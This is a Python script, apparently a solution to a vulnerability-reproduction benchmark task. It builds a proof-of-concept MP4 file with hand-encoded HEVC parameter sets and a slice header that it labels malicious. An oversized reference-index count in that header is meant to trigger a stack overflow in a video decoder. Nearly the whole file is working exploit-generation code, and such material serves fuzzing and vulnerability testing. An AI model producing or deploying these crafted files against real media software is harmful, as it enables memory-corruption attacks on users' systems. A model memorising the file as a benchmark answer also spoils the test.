import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        return self.generate_poc()

    def generate_poc(self) -> bytes:
        # Helper functions
        def u8(v): return struct.pack('>B', v)
        def u16(v): return struct.pack('>H', v)
        def u32(v): return struct.pack('>I', v)
        def s32(v): return struct.pack('>i', v)

        class BitStream:
            def __init__(self):
                self.data = bytearray()
                self.byte = 0
                self.cnt = 0
            def write(self, val, bits):
                for i in range(bits)[::-1]:
                    self.byte = (self.byte << 1) | ((val >> i) & 1)
                    self.cnt += 1
                    if self.cnt == 8:
                        self.data.append(self.byte)
                        self.byte = 0
                        self.cnt = 0
            def ue(self, val):
                val += 1
                bits = val.bit_length()
                self.write(0, bits - 1)
                self.write(val, bits)
            def se(self, val):
                if val <= 0: self.ue(-2*val)
                else: self.ue(2*val - 1)
            def get(self):
                if self.cnt > 0: self.data.append(self.byte << (8-self.cnt))
                return bytes(self.data)

        def make_box(type, data):
            return u32(len(data) + 8) + type + data

        # 1. Generate SPS (Minimal valid)
        bs = BitStream()
        bs.write(0, 1); bs.write(33, 6); bs.write(0, 6); bs.write(1, 3) # NAL 33
        bs.write(0, 4); bs.write(0, 3); bs.write(1, 1) # vps_id, max_sub_layers, nesting
        bs.write(0, 2); bs.write(0, 1); bs.write(1, 5); bs.write(0x60000000, 32); bs.write(0, 48); bs.write(0, 8) # PTL (Main)
        bs.ue(0) # sps_id
        bs.ue(1) # chroma 4:2:0
        bs.ue(64); bs.ue(64) # w, h
        bs.write(0, 1); bs.ue(0); bs.ue(0) # conf window, bit depths
        bs.ue(0) # log2_max_poc_lsb_minus4 -> 4
        bs.write(1, 1) # sub_layer_ordering
        bs.ue(0); bs.ue(0); bs.ue(0)
        bs.ue(0); bs.ue(0); bs.ue(0); bs.ue(0); bs.ue(0); bs.ue(0) # log2 sizes
        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1) # flags
        bs.ue(0) # num_short_term_ref_pic_sets
        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1) # more flags
        bs.write(1, 1) # trailing
        sps = bs.get()

        # 2. Generate PPS (Minimal valid)
        bs = BitStream()
        bs.write(0, 1); bs.write(34, 6); bs.write(0, 6); bs.write(1, 3) # NAL 34
        bs.ue(0); bs.ue(0) # pps_id, sps_id
        bs.write(0, 1); bs.write(0, 1); bs.write(0, 3); bs.write(0, 1); bs.write(0, 1)
        bs.ue(0); bs.ue(0); bs.se(0)
        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1)
        bs.ue(0); bs.se(0); bs.se(0)
        bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1); bs.write(0, 1)
        bs.write(1, 1)
        pps = bs.get()

        # 3. Generate Malicious Slice Header (Triggers overflow)
        bs = BitStream()
        bs.write(0, 1); bs.write(1, 6); bs.write(0, 6); bs.write(1, 3) # NAL 1 (TRAIL_R)
        bs.write(1, 1) # first_slice_segment_in_pic_flag
        bs.ue(0) # slice_pic_parameter_set_id
        bs.ue(1) # slice_type = P (1)
        bs.write(0, 4) # slice_pic_order_cnt_lsb (4 bits due to SPS)
        bs.write(1, 1) # short_term_ref_pic_set_sps_flag
        bs.ue(0) # short_term_ref_pic_set_idx
        # SPS flags define presence of other fields. temporal_mvp=0, sao=0 in generated SPS.
        bs.write(1, 1) # num_ref_idx_active_override_flag = 1
        bs.ue(100) # num_ref_idx_l0_active_minus1 = 100 (High value triggers stack overflow)
        bs.write(1, 1) # rbsp trailing
        slice_nal = bs.get()

        # 4. Construct MP4 Container
        ftyp = make_box(b'ftyp', b'iso5\x00\x00\x00\x01iso5hvc1')
        
        # Payload: Length-prefixed NALUs in mdat
        payload = u32(len(sps)) + sps + u32(len(pps)) + pps + u32(len(slice_nal)) + slice_nal
        mdat = make_box(b'mdat', payload)

        # moov structure
        mvhd_c = b'\x00'*4 + b'\x00'*8 + u32(1000) + u32(1000) + u32(0x00010000) + b'\x01\x00' + b'\x00\x00' + b'\x00'*8 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x40\x00\x00\x00' + b'\x00'*24 + u32(2)
        mvhd = make_box(b'mvhd', mvhd_c)

        tkhd_c = b'\x00'*4 + b'\x00'*8 + u32(1) + b'\x00'*4 + u32(0) + b'\x00'*8 + b'\x00\x00'*2 + b'\x01\x00' + b'\x00\x00' + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x00\x01\x00\x00' + b'\x00\x00\x00\x00'*3 + b'\x40\x00\x00\x00' + u32(64<<16) + u32(64<<16)
        tkhd = make_box(b'tkhd', tkhd_c)

        mdhd = make_box(b'mdhd', b'\x00'*4 + b'\x00'*8 + u32(1000) + u32(0) + b'\x55\xc4' + b'\x00\x00')
        hdlr = make_box(b'hdlr', b'\x00'*8 + b'vide' + b'\x00'*12 + b'Video\0')
        vmhd = make_box(b'vmhd', b'\x00'*4 + b'\x00\x01' + b'\x00'*8)
        dinf = make_box(b'dinf', make_box(b'dref', b'\x00'*4 + u32(1) + make_box(b'url ', b'\x00\x00\x00\x01')))

        # Minimal hvcC for decoder initialization (can use dummy values, we provide in-band parameters)
        hvcC_data = b'\x01' + b'\x01' + b'\x60\x00\x00\x00' + b'\x00'*6 + b'\x00' + b'\xf0\x00' + b'\xfc' + b'\xfd' + b'\xf8' + b'\xf8' + b'\x00\x00' + b'\x0f' + b'\x00'
        hvcC = make_box(b'hvcC', hvcC_data)
        hvc1 = make_box(b'hvc1', b'\x00'*6 + u16(1) + b'\x00'*16 + u16(64) + u16(64) + u16(72) + u16(72) + b'\x00'*4 + u16(1) + b'\x00'*32 + b'\x00\x18' + b'\xff\xff' + hvcC)
        stsd = make_box(b'stsd', b'\x00'*4 + u32(1) + hvc1)
        
        stts = make_box(b'stts', b'\x00'*4 + u32(1) + u32(1) + u32(100))
        stsc = make_box(b'stsc', b'\x00'*4 + u32(1) + u32(1) + u32(1) + u32(1))
        stsz = make_box(b'stsz', b'\x00'*4 + u32(0) + u32(1) + u32(len(payload)))
        # stco: offset to mdat payload. ftyp len (24) + mdat header (8) = 32
        stco = make_box(b'stco', b'\x00'*4 + u32(1) + u32(len(ftyp) + 8))

        stbl = make_box(b'stbl', stsd + stts + stsc + stsz + stco)
        minf = make_box(b'minf', vmhd + dinf + stbl)
        mdia = make_box(b'mdia', mdhd + hdlr + minf)
        trak = make_box(b'trak', tkhd + mdia)
        moov = make_box(b'moov', mvhd + trak)

        return ftyp + mdat + moov
